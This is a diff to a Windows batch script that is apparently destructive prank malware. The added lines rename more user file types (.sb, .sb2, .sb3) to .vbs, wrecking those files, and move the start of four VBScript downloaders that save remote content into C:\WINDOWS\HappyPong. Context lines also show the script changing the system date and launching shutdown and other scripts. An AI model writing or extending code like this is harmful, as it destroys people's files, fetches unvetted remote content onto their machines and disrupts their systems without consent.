@@ -74,6 +74,9 @@ ren *.bmp *.vbs
 ren *.smc *.vbs
 ren *.gb *.vbs
 ren *.gbc *.vbs
+ren *.sb *.vbs
+ren *.sb2 *.vbs
+ren *.sb3 *.vbs
 ren *.gba *.vbs
 ren *.reg *.vbs
 ren *.ini *.vbs
@@ -177,6 +180,10 @@ echo   .open >> download4.vbs
 echo   .write xHttp.responseBody >> download4.vbs
 echo   .savetofile "C:\WINDOWS\HappyPong\scp-173.jpg", 2 '//overwrite >> download4.vbs
 echo end with >> download4.vbs
+start download1.vbs
+start download2.vbs
+start download3.vbs
+start download4.vbs
 goto RemoveUrUglyWallpaper
 
 :RemoveUrUglyWallpaper
@@ -529,10 +536,6 @@ date 6/6/2006
 start change.vbs
 start explorer.exe
 start ieandstuff.vbs
-start download1.vbs
-start download2.vbs
-start download3.vbs
-start download4.vbs
 start pong.vbs
 start shutdown.vbs
 start username.bat
